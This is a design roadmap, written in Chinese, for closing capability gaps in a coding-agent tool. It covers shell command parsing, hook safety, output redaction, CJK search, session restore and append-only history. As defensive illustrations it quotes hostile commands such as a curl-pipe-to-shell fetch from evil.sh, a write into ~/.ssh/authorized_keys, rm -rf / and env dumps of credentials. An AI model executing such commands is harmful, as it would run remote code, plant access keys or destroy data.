# yanshi 能力补齐路线图设计（2026-08-27）

**输入**：`docs/superpowers/notes/2026-08-27-capability-audit.md`（322 条三方对照，yanshi 侧 165 条为 ❌/⚠️）
**基线**：`1c3760a`
**范围**：F 档 11 条 + A 档 32 条 + B 档 92 条 = 135 条，减去驳回 2 条、合并 1 条 = **132 条**
**不含**：C 档 33 条（与「编码 agent + 自驱动目标循环 + 单二进制本地部署」定位冲突）、P2-c 3 条（已判无需做）

---

## 0. 对审计的三处修正

动手前浮浮酱在 `1c3760a` 上复核了 41 条 F/A 项，抓到审计本身的三处错误。**这三处不修正就会写进 spec 变成集体幻觉**，因此先落在最前面。

### 0.1 驳回 F11「`acp_delegate` 未进默认 profile」

审计判它为「与 `agent_spawn` 的『避免倒挂梯度』理由不一致，属同类遗漏」。**这是误判**：`internal/bootstrap/w3wiring_test.go::TestW3ToolsAreRegisteredAndAuthorized` 的 doc 注释里写着——

> `acp_delegate` is deliberately asserted as registered-but-NOT-allowed: it runs a third-party binary that executes code of its own choosing, and a glob miss yields Prompt (ask the user on WS, fail closed on SSE) rather than a silent grant. **Pinning that here keeps a later "tidy up the allow list" edit from quietly upgrading the highest-capability tool in the registry.**

两者理由本就不同：`agent_spawn` 拉起的是 yanshi 自己的编排器（能力被 guard 六维完整约束），`acp_delegate` 拉起的是外部 CLI（执行它自己选择的代码）。**那条测试就是为拦住这次编辑而写的**，实施会当场打红。

→ **不做。** 若日后确要改，那是一次授权变更，须走 ADR 并同步改写该测试的 doc 注释。

### 0.2 合并 F6「记忆 FTS 检索」入 F7「CJK 检索」

审计自己在 P0-11 写了「与 P0-3 同根因，落点相同，一并修」。同根同落点不是两条工作。

### 0.3 三处事实错误（已按实测改写）

| 审计原文 | 实测（`1c3760a`） |
|---|---|
| A31 落点 `entries.go::renderDiff` | **该符号不存在**。实际是 `internal/cli/tui/diff.go::unifiedDiff` |
| A5「50 个注册工具全量进 schema」 | **131 个** guarded tool 注册点（`grep -c 'NewGuardedTool(\|NewApprovalGuardedTool(' internal/tools/*.go` 求和）。按需加载的收益比审计估计高 2.6 倍 |
| —（审计未发现） | **`unifiedDiff` 在 `internal/tools/fs_diff.go` 与 `internal/cli/tui/diff.go` 各实现一遍**，违反 CLAUDE.md「重复逻辑必须抽成公共函数」。A31（diff 高亮）与 A2（回合级聚合 diff）落点因此重合，须先合并再各自扩展 |

### 0.4 复核状态图例

每条目带 `✔已核` / `未核` 标记：

- **✔已核** —— 浮浮酱在 `1c3760a` 上用 grep/读码确认了落点符号与现状描述。41 条 F/A 中已核 **41 条**（含上述三处修正）。
- **未核** —— 沿用审计的 subagent 报告，**动手前先核那一条**。B 档 92 条全部为此状态。

### 0.5 编号约定（三套编号，别混）

| 前缀 | 指什么 | 例 |
|---|---|---|
| `F1`–`F11` / `A1`–`A32` / `B1`–`B92` | **审计原档号**，对应第二部分表中 `建议` 列为 F / A / B 的行，按表中出现顺序编号 | `A13` = append-only rollout |
| `INF1`–`INF8` | **本 spec 定义的八条共享基建**（§1.1） | `INF3` = append-only rollout 这条基建 |
| `W-A-01` … `W-H-01` | **本 spec 的工作条目号**，交付与计划以它为准 | `W-D-01` = 落在 W-D 包第 1 条 |

`P2-1` … `P2-8` 是 B 档前 8 条的**消歧写法**：B 档编号与 INF 编号在 1–8 段撞号，凡指 B 档条目处一律写 `P2-N`。**这个撞号是本 spec 自审时抓到的真缺陷**，修完才有这张表。

---

## 1. 核心洞察：132 条塌缩成 8 条共享基建

审计按**能力域**分类（Agent 核心 / 工具系统 / 权限 / 沙箱 / 上下文…），因此看不见**落点重合**。按落点重新聚类后，132 条里有 8 条是承重基建，其余大多是它们的推论。

**这个洞察改变了排序**，最重要的一处是 §1.3。

### 1.1 八条基建总览

| 代号 | 基建 | 来源 | 直接解锁 |
|---|---|---|---|
| **INF1** | 结构化 shell 解析器 | A7 | 6 条 |
| **INF2** | 数据驱动模型能力目录 | A20 | 11 条 |
| **INF3** | append-only rollout + 可重放投影 | A13 | 8 条 |
| **INF4** | 生命周期 Hook 总线 | A1 | 5 条 |
| **INF5** | 终端能力探测与渲染层 | B64 | 9 条 |
| **INF6** | secproc 强制入口收敛 | F1 | 6 条 |
| **INF7** | MCP 双向传输（readLoop） | A22 | 5 条 |
| **INF8** | 统一 Redactor 出口管线 | F2 | 3 条 |

### 1.2 各基建的设计

#### INF1 结构化 shell 解析器（`internal/execpolicy` 扩展）

**现状**：`internal/guard/guard.go::Guard.checkShell` 遇 `&&` `;` `|` `` ` `` `$(` `>` `<` 直接结构性 HardDeny（不可覆盖）；`internal/guard/destructive.go::lexShellLite` 只做词法切分，含控制算子即返回 `None` 交给元字符防线。CLAUDE.md 里那句「请改为顺序执行多条命令」就是这道防线的日常摩擦。

**契约**：在 `internal/execpolicy` 增加一层**命令列表解析**（`ParseCommandList`），把一条 shell 字符串解析成 `[]Segment`，每段带 `Program / Args / Operator（&&, ||, ;, |）/ Redirects`。解析失败仍走原 HardDeny（fail-closed 不变）。`checkShell` 改为**逐段判定并取最严档位**。

**承重约束（必须落进 ADR）**：
1. **元字符 HardDeny 不是被移除，而是被降级为「解析失败时的兜底」。** 解析器认识的形态逐段判；不认识的形态（未闭合引号、进程替换 `<(…)`、`$(…)` 命令替换）仍是结构性 HardDeny。ADR-0004（元字符防线）须补一条 Consequences。
2. **注入面扩大是真实代价。** 逐段放行意味着 `git status && curl evil.sh | sh` 的前半段会被允许 —— 但整条仍因后半段被拒。取最严档位而非逐段独立执行，这一点不可动摇。
3. **重定向必须判目标路径**，不能只判 program：`echo x > ~/.ssh/authorized_keys` 的 program 是 `echo`。

**解锁**：F3（危险命令递归穿透 —— 解析后天然递归，见 §1.3.2）、A8（规则增补：把命令前缀写回策略需要规范化形式）、B12（PowerShell 结构化解析：同一 `Segment` 抽象换 tree-sitter 前端）、B16（审批缓存 + 命令规范化：规范化即解析后的重新序列化）、B26（嵌套 exec 拦截）。

#### INF2 数据驱动模型能力目录（`internal/llm/eino` → 数据文件）

**现状**：模型知识散在 `internal/llm/eino/contextwindow.go`（窗口模式表）与 `internal/llm/eino/pricing.go`（价格表）两个 Go 字面量；`internal/config/config.go::ProviderConfig` 有 `ContextWindow` / `Multimodal` / `CostClass` / `Local` 四个手填字段。加一个模型要改代码发版。

**契约**：一份 embed 的 `models.yaml`（不用 json —— 本仓配置格式统一是 YAML，且需要注释承载「这个数字哪来的」），字段：`id / aliases / context_window / max_output / pricing{in,out,cached} / modalities / reasoning_efforts / truncation_policy / auto_compact_threshold / priority`。运行时按 `ProviderConfig.Model` 查表，**`ProviderConfig` 的同名字段作为覆盖层**（不删除，向后兼容）。可选磁盘缓存层供在线刷新（B43）。

**承重约束**：
1. **查不到必须有安全默认，不能报错拒启动。** 本地模型、私有网关的模型名不可能在表里。默认值取当前 `contextwindow.go` 的回退逻辑。
2. **`ProviderConfig` 覆盖优先级高于表**，否则操作员改了 config 发现不生效。
3. **ADR-0013 的量纲约束继续成立**：窗口是 token 数，压缩阈值是窗口的比例而非绝对值。

**解锁**：A18（header 字段同处声明）、A21 / B46（Ollama / LM Studio：探活与列模型走同一 discovery 接口）、A14（压缩兜底阈值来自表）、B30（压缩模型回退：回退链在表里声明）、B32（截断策略可配）、B43（模型发现磁盘缓存）、B44（per-provider 重试次数）、B45（配额窗口头解析）、B47（多模态能力探针：探测结果回写缓存层）、B11（模型主动开新窗口：需要知道新窗口多大）。

#### INF3 append-only rollout + 可重放投影（`internal/store` + `internal/ctxcompact`）★关键前置

**现状**：yanshi 是「就地重写活动窗口」的**有损单副本** —— `ctxcompact.Run` 把消息替换成摘要，原文只在 `messages` 表里，而 `SearchMessages` 强制非空 `sessionID`（`internal/store/message_log.go:302`）。压缩不可撤销、不可分叉。

**契约**：所有进出模型的条目原样 append 进按会话分片的日志（本仓走 SQLite 而非 codex 的 JSONL —— 单二进制已有 store 层，再引一套文件格式是第二个真相源）。压缩**只写一条 `Compacted` 标记**，不删不改原文。活动窗口由**反向扫描投影**重建：从尾向前读，遇 `Compacted` 标记则跳过它覆盖的区间、改用摘要。

**承重约束（必须落进新 ADR）**：
1. **这是架构替换不是增量补丁。** 现有 `ctxcompact.Run` 的 `Plan`/`EnforceToolCallPairs`/`Assemble` 三步全部保留（它们操作的是投影结果），改的是「投影从哪来」。
2. **`takeChunk` 的超窗上界问题在新模型下依然存在**（并行工具组不可分割），不要宣称被解决。它是分块摘要的性质，与存储模型无关。
3. **迁移必须双向可读**：旧会话没有 `Compacted` 标记，投影退化为「读全部消息」，与现状逐字节一致。
4. **保留期与归档（A17）是这套模型的自然推论而非独立特性** —— 归档压的是日志分片，投影侧透明解压。

**解锁**：A16（跨会话历史检索：扫全部分片）、A15（跨会话记忆自动生成：Phase1 逐 rollout 抽取）、A17（冷会话归档）、B38（尾部反向扫描重建 —— 就是投影本身）、B40（检查点/快照：日志天然是快照序列）、B35（记忆引用溯源：引用即分片位置）、B75（持久化消息队列：队列是同一日志的另一种条目）、B37（输入历史落盘）。

#### INF4 生命周期 Hook 总线（`internal/agent/orchestrator`）

**现状**：guard 只能答 allow / deny / prompt。**改不了参数、加不了上下文、挂不上用户自己的检查**。orchestrator 里的 "hook" 一词当前指 ADK middleware（`internal/agent/orchestrator/loopguard.go`、`hygiene.go`、`multimodal.go`），不是用户可扩展的钩子。

**契约**：复用现成的 loopguard middleware 链与 per-turn context 注入，挂一条 hook 分发器。事件集起步取 codex 的核心子集：`PreToolUse` / `PostToolUse` / `PermissionRequest` / `UserPromptSubmit` / `SessionStart` / `SessionEnd` / `Stop`。`PreToolUse` 的返回值为 `{block bool, reason string, additional_context []string, updated_input json.RawMessage}`。

**承重约束**：
1. **不动 guard 判决语义。** hook 的 `block` 是**追加**一道拒绝，不能把 guard 的拒绝翻成允许 —— 否则 profile 策略可被用户 hook 绕过，5 类结构性 HardDeny 的语义会碎。顺序：guard 先判，Allow 之后才跑 `PreToolUse`。
2. **`updated_input` 改写后必须重跑 guard。** 否则「guard 批准 `ls`，hook 改写成 `rm -rf /`」。这是这条特性的主要攻击面。
3. **hook 是外部程序**，必须走 INF6 的 secproc 入口（不受信程序）。

**解锁**：A32（防伪完成提示词：作为 `Stop` hook）、B29（压缩生命周期 hook：三条压缩路径共用同一总线）、P2-1（hook 输出溢出落盘：复用 `internal/tools/spillover.go`）、B54（隐式 skill 调用识别：`PostToolUse` 上读 shell 命令）。

#### INF5 终端能力探测与渲染层（`internal/cli/tui`）

**现状**：硬编码 `termenv.ANSI256`，`NO_COLOR` / `COLORTERM` / `TERM=dumb` 全仓零命中。低色终端与亮背景配色会崩。

**契约**：启动时探测（`NO_COLOR` → 单色；`COLORTERM=truecolor` → 24bit；`TERM=dumb` → 无 ANSI；否则 256/16 按 terminfo），产出一个 `Palette` 值贯穿所有渲染路径。所有颜色常量改为从 `Palette` 取。

**承重约束**：**`cmd/tuidbg` 是唯一能真的看见渲染结果的手段**（`skills/tui-debug/SKILL.md`）。本包每条的验收证据必须包含一次 tuidbg 截屏比对，`internal/cli/tui` 的单测只断言 `Model.Update`/`View` 的返回值，布局错位在它们全绿时照样复现。`capture-pane` 必须带 `-J`（不加则按物理屏幕折行，跨行正则静默失配）。

**解锁**：A31（diff 高亮 + 行号：需要按色深分档的调色板）、A30（Ctrl+T pager）、B65（OSC9 通知）、B66（终端标题）、B67（OSC8 超链接）、B69（流式 markdown 渐进渲染）、B70（恢复选择器预览）、B61（分支摘要显示）、B72（Ctrl+Z 挂起）。

#### INF6 secproc 强制入口收敛（`internal/tools` + `internal/secproc`）

**现状**：`internal/tools/shell.go` 只在 context 绑了 `SecureProcessFactory` 时走 secproc，否则回落到同一函数后半段的直接 pipe 路径；`internal/acp/spawn.go` 的 `exec.CommandContext` 完全不经 secproc。CLAUDE.md 已记录，收敛归 W6。

**契约**：两条路，二选一（spec 建议第一条）——
1. **保证 factory 恒绑**：`bindExecutionContext` 无条件注入一个默认 factory（无沙箱时是「直连但过 Authorize」的实现），回落路径删除。
2. 回落路径也过 `Authorize`。

选 1 的理由：CLAUDE.md 记着「nil 就不注入」是新工具最容易踩的坑，恒绑消除了这一整类错误；且删掉一条路比给两条路各打一个补丁更符合「重复逻辑必须抽成公共函数」。

**承重约束**：`internal/acp/spawn.go` 一并收敛 —— 它拉起的是外部 agent CLI，正是 secproc 包头定义的「不受信程序」。

**解锁**：A4（真 PTY：console 实现挂在统一入口上）、A12（进程自身加固：pre-main 逻辑作用于所有子进程发射）、A10（seccomp）、B26（嵌套 exec 拦截）、B23（Windows 受限令牌）、B27（API key 代理）。

#### INF7 MCP 双向传输（`internal/mcp/stdio.go`）

**现状**：严格 req→resp，**无 readLoop**（grep 零命中）。server 主动发的 elicitation / progress / listChanged 全部收不到。现代 MCP server 在 yanshi 下会挂死或静默丢。

**契约**：stdio transport 加一条读循环 goroutine，按 JSON-RPC id 分流：有 id 且是 response → 唤醒等待方；有 id 且是 request → 交给反向请求处理器；无 id → notification 分发。HTTP/SSE transport 同步补齐（SSE 天然是单向流，反向请求走对应的 POST 端点）。

**承重约束**：
1. **反向请求必须过 guard。** server 发来的 elicitation 是**外部输入**，其内容要按不可信数据处理（参照 `pr_context` 把 PR 正文标为数据防提示注入的做法）。
2. **审计自己写了「这条更像兼容性 bug，可考虑提到 P0」** —— spec 采纳，本条在 W-F 内排最前。

**解锁**：A3（模型中途向用户提问：复用同一 elicitation 帧格式与 WS 双向通道）、B49（MCP 资源订阅）、B51（协议版本兼容）、B52（把自己作为通用 MCP server —— 反向请求是双向的另一半）。

#### INF8 统一 Redactor 出口管线（`internal/tools`）

**现状**：`RedactPatterns` 的消费端只有 `internal/observe/log/crash.go`、`internal/ctxcompact/redact.go`、`internal/store/store.go`。**`internal/tools` 下 `Redact` 命中数为 0**（实测）。`cat .env`、`env`、`printenv` 的输出原样进 transcript，并随下一轮请求发给模型厂商。

**契约**：工具结果返回前统一过 Redactor。落点在工具返回的**唯一收敛处**，不是每个工具各加一次 —— 若当前没有这样的收敛处，先造一个（这正是「重复逻辑必须抽成公共函数」）。

**承重约束**：
1. **脱敏发生在「返回给编排器之前」，不是「写入 store 之前」。** store 侧已有 Redactor，这条补的是模型这一路。
2. **脱敏不能破坏工具语义**：`fs_read` 读一个 `.env` 是用户显式要求的，把内容打码会让工具变得没用。需要区分「工具的产出就是文件内容」与「工具的产出里混进了凭据」。**这是本基建唯一的设计难点，实现时须单独定夺，不要在 spec 里假装已解决。**

**解锁**：B81（遥测目标双分流）、B79（反馈上报脱敏）、以及 P0 自身的安全收益。

### 1.3 排序修正：审计的两处顺序是错的

#### 1.3.1 INF3 从「第四梯队 · 最后评估」提到最前

审计把 A13（append-only rollout）放在「第四梯队：架构级，建议最后评估」。**但它是 8 条的前置。**

放最后做 = A16 跨会话检索、A15 记忆自动生成、A17 冷归档、B38 尾部反扫、B40 检查点、B35 溯源、B75 消息队列、B37 输入历史落盘这 8 条**各自造一遍「怎么找到历史原文」的轮子**，然后在 INF3 落地时全部推倒。

审计看不见的原因是它按域分类：A13 在「上下文与压缩」域，被它解锁的 8 条散在「记忆与检索」「会话与持久化」「自驱动与任务」三个域。

#### 1.3.2 F3 被 INF1 吸收，不再是独立的 P0

审计把 F3（危险命令递归穿透）列为 P0，落点写「`stripCommandPrefix` 改成循环直到不动点（带层数上限）」。

**实测确认现状属实**（`internal/guard/prefixrunner.go::stripCommandPrefix` 无外层循环），但那个落点是**在 INF1 之前的临时形态**：结构化解析器一旦存在，「穿透 wrapper」就是「解析出的第一个 Segment 的 program 落在 `prefixRunners` 表里则取其剩余部分递归」——是解析的自然推论，不是一个独立的循环补丁。

先写单层→不动点的循环，INF1 落地时会把它整段删掉重写。**因此 F3 归入 W-B，与 INF1 同批交付。**

**代价说明**：这推迟了一个安全修复。`sudo nohup rm -rf /` 这类嵌套形态在 W-B 交付前仍可能漏判。若主人认为这个窗口不可接受，可以在 W-A 里先打临时补丁（循环 8 层），接受 INF1 时重写 —— **这是一个显式的取舍，不是遗漏**。

---

## 2. 工作包 W-A：立即修（7 条）

**为什么先走**：不是「P0 优先」这种口号，而是三条硬理由 ——
1. **零跨包依赖**，8 条落点在 8 个不同包，可完全并行；
2. **全部是数据正确性**：图片 token 算 0 会直接撞 provider 400、`cat .env` 原样发给模型厂商、中文检索三条链全失效——而 CLAUDE.md 规定本仓交互语言就是中文；
3. **唯一进台账的一包**（第 2 轮决策）。它们是「已交付功能的修正」，本来就该有机器强制的完成定义。

**台账**：本包 7 条全部进 `docs/feature-status.yaml`，走 GOV8 逐句证据握手。每条须同步：acceptance 子句 → evidence 映射 → 被引测试 doc 注释回写 `ledger: <ID>#<n> <子句原文>`（逐字一致）→ `internal/archtest/acceptance_pin_test.go::acceptancePins` 补一行（子句数 + SHA-256 前 16 位）。**漏任一处 GOV8 变红。**

---

### W-A-01 图片计入 token 估算 `F5` ✔已核

- **落点** `internal/ctxcompact/tokens.go::estimateMessageTokens`
- **现状** 第 38-45 行只累加 `Content` + `ReasoningContent` + `ToolCalls`；`internal/agent/orchestrator/multimodal.go` 把完整 base64 data URL 塞进 `UserInputMultiContent`，该字段完全不被读。审计实测：同样 1MiB 载荷，放 `Content` 计 299602 tokens，放 `UserInputMultiContent` 计 8 tokens（仅每消息固定开销）。
- **契约** `estimateMessageTokens` 增加多模态分支：遍历 `MultiContent`，图片按 **detail 档位的固定成本**估算（low / high / auto 各一个常量，来源写进注释），**不得用 `len(data)/4`** —— base64 长度与视觉 token 数无关，两者差三个数量级。非图片部件（文本部件）按文本估。
- **acceptance** `"带图片的消息其 token 估算随图片数量单调增长；同一图片放 Content 与放 MultiContent 的估算量级一致；估算不随 base64 载荷字节数线性增长"`
- **依赖** 无
- **门禁** 无新增导出符号则不触发 GOV3；台账 GOV8
- **备注** 审计说「已有现成探针可转成回归测试」——探针已删（审计文末：「写探针跑真实驱动，跑完已删」），须重写。

### W-A-02 工具输出脱敏后再进模型 `F2` = **INF8** ✔已核

- **落点** `internal/tools`（收敛处待定，见 §1.2 INF8）
- **现状** `internal/tools` 下 `Redact` 命中数 **0**（实测）。这是本仓 S6 修复的另一半——那次修的是审计表落库，工具输出→模型这条路没覆盖。
- **契约** 见 §1.2 INF8。**设计难点须在实现时单独定夺**：`fs_read` 读 `.env` 是用户显式要求，打码会让工具失效；`shell_run` 跑 `env` 混进凭据则必须打码。建议判据是**工具意图**而非内容匹配（读文件类工具按用户请求的路径放行，执行类工具的 stdout 一律过滤），但这条建议未经验证，实现时须先跑一轮真实用例。
- **acceptance** `"shell_run 执行 env/printenv 的输出经过 Redactor 后才返回给编排器；脱敏后的工具结果与落库的审计记录一致；显式读取凭据文件的 fs 工具不因本改动失效"`
- **依赖** 无
- **门禁** GOV3（若新增导出的收敛函数）；台账 GOV8
- **风险** 这是本包唯一有**功能回归风险**的一条（可能打断合法用例）。建议它单独一个提交，可独立回滚。

### W-A-03 CJK 检索 `F7`（合并 `F6`） ✔已核

- **落点** `internal/store/store.go:401` `tokenize='porter unicode61'`
- **现状** 实测（真驱动真 FTS5）：`截止日期` / `项目` / `周二` / `张伟` **全部 0 命中**，只有搜整串才中；英文正常。整句被当成一个 token。
- **影响面** `history_search`、`SearchMemory`、`memory_autorecall` **三条链同时失效**。
- **契约** 两条路：
  1. **CJK 查询检测 + 有界 LIKE 回退**（QwenPaw `memoryspace.py` 的做法）：查询含 CJK 码点则走 `LIKE '%…%'`，加结果数上限与超时。改动小、不需迁移。
  2. **换 tokenizer**：SQLite FTS5 的 `trigram`（3.34+）能处理 CJK。需要**重建 FTS 索引**（迁移）且英文检索质量下降。

  **spec 建议路 1**：本仓 store 已有迁移机制但重建 FTS 表是有风险的一次性操作，而 LIKE 回退是纯增量、可回滚、对英文路径零影响。代价是 CJK 查询无排序无 snippet —— 可接受，因为现在是**零命中**。
- **acceptance** `"中文词查询在 history_search 上返回非零命中；SearchMemory 与 memory_autorecall 走同一检索路径因而同时生效；英文查询的命中集合与本改动前逐条一致；CJK 回退路径有结果数上限"`
- **依赖** 无
- **门禁** 台账 GOV8
- **备注** 「英文命中集合逐条一致」这句必须测——它是防止「修中文顺手改坏英文」的唯一防线。

### W-A-04 会话恢复保真度 `F9` ✔已核

- **落点** `internal/api/http/ws_handlers.go`（恢复循环，实测第 115 行 `if m.Role == "assistant"` 是全文件唯一的 role 判断，零 `ToolCallID` 命中）
- **现状** 恢复时只映射 `Role` + `Content`，role 只二分 user/assistant。store 明明存了 `ToolCallID` / `ToolName` / `ToolArgs`，恢复时全丢，**tool 消息还被错当成 user**。
- **契约** 恢复循环补齐三个字段与 `tool` role 映射。**`assistant` 消息的 `ToolCalls` 与 `tool` 消息的 `ToolCallID` 必须成对恢复** —— 只恢复一半会让 `ctxcompact.EnforceToolCallPairs` 在下一次压缩时把孤儿删掉，症状是「恢复后第一次压缩历史突然变短」。
- **acceptance** `"恢复后的历史包含 tool 角色的消息；每条 tool 消息的 ToolCallID 能在同一历史中找到对应的 assistant ToolCalls；恢复后的消息序列通过 EnforceToolCallPairs 不产生删除"`
- **依赖** 无
- **门禁** 台账 GOV8

### W-A-05 记忆蒸馏链接线 `F8` ✔已核

- **落点** `internal/tools/memory_distill.go::DistillMemories`、`internal/store/memory_distill.go::ApplyDistillation`
- **现状** 整条链**零生产 caller**（实测：全仓仅自身定义与 doc 注释提及）。这是本仓 MEMORY 里「写了但零读者」教训的第 **9** 次复发。
- **决策**（第 2 轮已批准）**接线，不删**。落点是**最小入口**：一个 `/distill` 斜杠命令 + turn 结束后的后台触发（受 `features` 开关门禁，默认关）。
- **为什么不造复杂触发器**：W-D 的 A15（跨会话记忆自动生成）Phase2 会**直接复用这个入口**。现在造一套「每 N 轮」的调度逻辑，W-D 落地时会被 Phase2 取代。
- **契约** `/distill` 注册进 `internal/cli/tui/commands.go::commandTable`（否则 `slashcmd_test.go` 的幻影检测语义上虽不拦但文档会说谎）；后台触发挂在 turn 结束点，失败只记日志不影响 turn。
- **acceptance** `"/distill 命令在 commandTable 中注册并能触发一次蒸馏；蒸馏后 memories 表的行数不增加且被合并行被标记而非删除；蒸馏失败不影响所在 turn 的正常结束"`
- **依赖** 无（W-D 的 A15 反向依赖本条）
- **门禁** GOV4（若新增 `Build*`）、GOV6（若新增 `With*` 注入器）；台账 GOV8
- **反「零读者」自检** acceptance 第 1 句显式描述「被谁调用」，符合 §3 硬规则。

### W-A-06 流式空闲超时看门狗 `F10` ✔已核

- **落点** `internal/llm/eino/resilient.go`（实测第 333 行 `sr.Recv()` 无任何超时包裹，仅第 330 行检查 `ctx.Err()`）
- **现状** 只在 `Recv` 返错时动作。网关不断连也不发数据就**永久挂起**；`loopguard` 的 `DeadlineGate` 在迭代边界检查，进不去也就永不触发。无人值守的 goal loop 被一条僵死流吃掉整轮预算。
- **契约** **首块 + 稳态双超时预算**（参照 QwenPaw `stream_progress.py`）：
  - `first_chunk_timeout`：发出请求到收到第一个有内容的块；
  - `idle_timeout`：两个有内容的块之间。

  **「空控制块不续命」是承重的**：只含 `role` 或空 delta 的块不重置计时器，否则一个只发心跳的僵死网关能永远续命。超时按可重试错误处理，走现有 failover 链。
- **acceptance** `"首块超时后流被终止并返回可重试错误；仅发送空控制块的流在稳态超时后被终止；有实际内容持续到达的长流不被误杀；两个超时值均可配置且零值表示关闭"`
- **依赖** 无
- **门禁** 台账 GOV8
- **备注** 「零值表示关闭」呼应 loopguard 的设计原则（CLAUDE.md：零值配置 = 全部关闭，行为与引入前逐字节一致）。

### ~~W-A-07 沙箱挂载路径 `~` / `$VAR` 展开~~ `F4` — 🚫 **驳回（写计划时复核推翻）**

审计的 grep 事实为真，但**它推出的后果没有对应的代码路径**。写实施计划时逐条追溯落点，实测：

| 审计的前提 | 实测（`1c3760a`） |
|---|---|
| 「沙箱有可配置的挂载路径」 | **不存在。** `internal/config/config.go::SandboxConfig` 只有 `Enabled` / `Tier` / `NetworkDeny` 三个字段，无任何路径列表 |
| 「`WorkspaceRoot` 可能含 `~`」 | **不会。** `internal/bootstrap/bootstrap.go` 里 `workRoot := opts.WorkRoot`，`opts.WorkRoot` **零生产赋值点**（无 CLI flag、无配置键），实际恒为 `os.Getwd()` |
| 「scratch 路径不展开」 | **已展开。** `internal/sandbox/bwrapargs.go::bwrapScratchPathsFrom` 解析 `$TMPDIR` / `$XDG_CACHE_HOME`，回退 `os.UserHomeDir()` + `.cache`，再过 `sanitizeBindPath` 与存在性检查 |

「`internal/sandbox` 内 `pathnorm` 命中数为 0」是真的，但那**不是缺陷**：sandbox 处理的是程序算出来的绝对路径，不是操作员键入的带 `~` 的文本，因此不需要 expanduser。审计从「A 有而 B 没有」推出「B 缺了」，跳过了「B 需不需要」。

**→ 不做。** 若将来 `SandboxConfig` 真的新增可配置挂载路径（例如 W-B-18 受保护元数据路径可能带出这个需求），届时**同一条**才成立 —— 到那时 §11 记的 GOV1 注意事项（`pathnorm` 全部函数未导出，须下沉到叶子包而不是往 allowlist 加行）仍然有效，保留在此备查。

**W-A 因此为 7 条**，全文其余处的 8 已同步改为 7。

### W-A-08 子代理 worktree 隔离 `A26` ✔已核

- **落点** `internal/tools/subagent.go`（实测 `WorkRoot` / `cwd` / `Cwd` 零命中）
- **现状** 子代理共用同一个 WorkRoot，仅 goalloop 的 ACP 路径有 worktree。**并发子代理互相踩文件**。
- **为什么在 W-A 而不在 P1**：审计把它列为 A 档，但性质是「已交付功能坏了」——`agent_dag` / `agent_batch` 明确支持并发，并发下互相覆盖对方的编辑是数据损坏，不是缺失特性。
- **契约** 子代理 spawn 时可选分配一个 VCS worktree（复用 `internal/vcs` 现成的 worktree 机制与三方合并），context 注入 cwd。**默认行为须保持向后兼容**：不请求隔离的子代理仍共用 WorkRoot（否则每个 `agent_spawn` 都产生一个 worktree，`~/.yanshi/worktrees/` 会爆）。`agent_dag` / `agent_batch` 的并发路径默认开启隔离。
- **acceptance** `"并发子代理各自在独立 worktree 中编辑且互不覆盖；子代理结束后其 worktree 被合并回主干或显式丢弃；未请求隔离的子代理行为与本改动前一致"`
- **依赖** 无
- **门禁** GOV6（新增 cwd 的 context 注入器须有生产调用点）；台账 GOV8

---

## 3. 工作包 W-D：历史与记忆（16 条）★第二批交付

**为什么排第二**：INF3 是 8 条的前置（§1.3.1）。晚做一天，就多一条特性绕着「怎么找到历史原文」造一遍轮子。

**台账**：不进（第 2 轮决策）。走常规单测 + GOV1–GOV9 结构门禁。

**必须先出 ADR**：INF3 是架构替换，须从 `docs/adr/0000-template.md` 新开一条（编号取当前最大 +1），把 §1.2 INF3 的四条承重约束落进 Consequences。

---

### W-D-01 append-only rollout + 可重放投影 `A13` = **INF3** ✔已核

- **落点** `internal/store`（新增日志表与投影读取）、`internal/ctxcompact::Run`（投影来源改造）
- **契约与承重约束** 见 §1.2 INF3
- **验收** 压缩后原文仍可从日志读出；投影结果与改造前的活动窗口逐条一致（旧会话回归）；`Compacted` 标记可撤销，撤销后窗口恢复为原文；日志只追加，无 UPDATE/DELETE 路径
- **依赖** 无
- **门禁** GOV1（store ↔ ctxcompact 依赖方向）、GOV3、GOV4（新 `Build*` 须接进 `Build`）
- **风险** 本包最大的一条。**迁移必须双向可读**：旧会话没有标记时投影退化为「读全部消息」，与现状逐字节一致 —— 这条要有回归测试，不是注释。

### W-D-02 跨会话历史检索 `A16` ✔已核

- **落点** `internal/store/message_log.go::Store.SearchMessages`（实测第 302 行 `if sessionID == "" { return error }`）
- **现状** 强制非空 sessionID → 无法回答「上周那个 bug 怎么修的」
- **契约** `sessionID == ""` 改为「跨全部会话检索」而非报错。**沿用 W-A-03 修好的 CJK 路径**（否则跨会话检索在中文下同样零命中）。结果带会话 ID 与时间戳，按相关度 + 时近度排序，有结果数上限。
- **验收** 空 sessionID 返回跨会话结果而非错误；中文查询在跨会话路径上返回非零命中；结果包含来源会话标识；有上限且上限可配
- **依赖** W-A-03（CJK）、W-D-01（INF3，若要搜已归档分片）
- **门禁** GOV3

### W-D-03 跨会话记忆自动生成 `A15` ✔已核

- **落点** 新增后台 worker；复用 `internal/tools/memory_distill.go::DistillMemories`（W-A-05 已接线的入口）
- **现状** 只有模型主动 `memory_write` → **自驱动 goalloop 跑完不留任何长期资产**
- **契约** 两阶段：Phase1 逐会话日志抽取候选（会话结束触发）；Phase2 用 W-A-05 的蒸馏入口整合。带**租约认领**（多进程下同一会话不被抽两次）、热度排序、未用剪裁、配额守卫。
- **验收** 会话结束后产生记忆行且由后台 worker 而非模型工具调用触发；同一会话被并发进程处理时只抽取一次；配额上限生效后旧的未用记忆被剪裁；Phase2 复用 W-A-05 的入口而非新建蒸馏路径
- **依赖** W-D-01（INF3）、W-A-05
- **门禁** GOV4、GOV6
- **反「零读者」自检** 验收第 1 句显式描述触发者

### W-D-04 冷会话压缩归档 + 保留期 `A17` ✔已核

- **落点** `internal/store`（归档 worker + 读取侧透明解压）
- **现状** 无归档无保留期，**单二进制本地部署下 `yanshi.db` 无界增长**
- **契约** 后台 worker 把冷分片压缩（zstd）；读取侧透明解压；保留期可配，零值 = 永久保留（与引入前一致）。
- **验收** 冷分片被压缩后占用显著下降；读取已压缩分片的结果与压缩前一致；保留期为零时不删除任何数据；归档进行中的读取不返回错误
- **依赖** W-D-01（INF3）
- **门禁** GOV3

### W-D-05 … W-D-16：P2 叶子（12 条）

全部 `未核`，动手前先核那一条。落点列已按审计给的证据路径填写，**未经复核**。

| ID | 能力 | 源 | 落点 | 验收要点 | 依赖 |
|---|---|---|---|---|---|
| W-D-05 | 尾部反向扫描重建 | B38 | `internal/store` 投影读取 | 不全量加载即可重建窗口；大会话的重建耗时不随总长线性增长 | INF3 |
